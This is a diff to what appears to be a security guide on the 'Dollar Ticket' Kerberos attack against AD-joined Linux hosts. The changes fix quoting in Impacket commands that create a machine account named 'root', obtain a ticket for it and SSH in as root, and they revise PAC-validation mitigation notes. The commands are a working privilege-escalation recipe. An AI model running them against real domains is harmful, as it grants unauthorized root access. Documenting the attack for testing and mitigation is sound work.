@@ -62,13 +62,13 @@ The attack can be conducted from any system with Impacket tools and network acce
 kinit $USER
 
 # Create machine account with privileged username (targeting 'root')
-addcomputer.py -k -dc-host $DC_IP -computer-name 'root' -computer-pass 'ComplexPassword123!' '$DOMAIN/$USER'
+addcomputer.py -k -dc-host $DC_IP -computer-name 'root' -computer-pass 'ComplexPassword123!' "$DOMAIN/$USER"
 
 # Alternative: Use LDAPS for account creation
-addcomputer.py -debug -k -dc-host $DC_IP '$DOMAIN/$USER' -method LDAPS -computer-name root
+addcomputer.py -debug -k -dc-host $DC_IP "$DOMAIN/$USER" -method LDAPS -computer-name root
 
-# Request ticket for newly created account
-kinit root
+# Request ticket for newly created machine account (note the trailing $)
+kinit 'root$'
 
 # Authenticate to target Linux/Unix service
 ssh -o PreferredAuthentications=gssapi-with-mic -l root $TARGET
@@ -78,10 +78,10 @@ For environments requiring password authentication instead of Kerberos:
 
 ```bash
 # Create machine account with password
-addcomputer.py -dc-ip $DC_IP -computer-name 'root' -computer-pass 'ComplexPassword123!' '$DOMAIN/$USER:$PASSWORD'
+addcomputer.py -dc-ip $DC_IP -computer-name 'root' -computer-pass 'ComplexPassword123!' "$DOMAIN/$USER:$PASSWORD"
 
 # Request TGT for the machine account
-getTGT.py '$DOMAIN/root$:ComplexPassword123!' -dc-ip $DC_IP
+getTGT.py "$DOMAIN/root\$:ComplexPassword123!" -dc-ip $DC_IP
 
 # Export ticket for use
 export KRB5CCNAME=root\$.ccache
@@ -115,7 +115,7 @@ Remove the created machine account after testing:
 
 ```bash
 # Using Impacket
-addcomputer.py -delete -dc-ip $DC_IP -computer-name 'root' '$DOMAIN/$USER:$PASSWORD'
+addcomputer.py -delete -dc-ip $DC_IP -computer-name 'root' "$DOMAIN/$USER:$PASSWORD"
 ```
 
 ```powershell
@@ -177,9 +177,10 @@ pac_check = pac_present, upn_dns_info_ex_present
 The `pac_check` options enforce:
 
 - `pac_present`: Requires PAC structure in all tickets
-- `check_upn`: Validates UPN fields
-- `check_upn_dns_info_ex`: Validates DNS information in PAC
 - `upn_dns_info_ex_present`: Requires UPN-DNS-INFO structure with consistent content
+
+> [!NOTE]
+> For full PAC validation when Dollar Ticket Attack mitigations are applied at AD level, the combination of `pac_present` and `upn_dns_info_ex_present` ensures that tickets must have PAC structures and that the UPN-DNS-INFO content is consistent with the rest of the PAC and the ticket. Additional options like `check_upn` and `check_upn_dns_info_ex` can be added based on security requirements.
 
 > [!NOTE]
 > PAC validation requires all users to have PAC issued, which is standard for Active Directory environments.
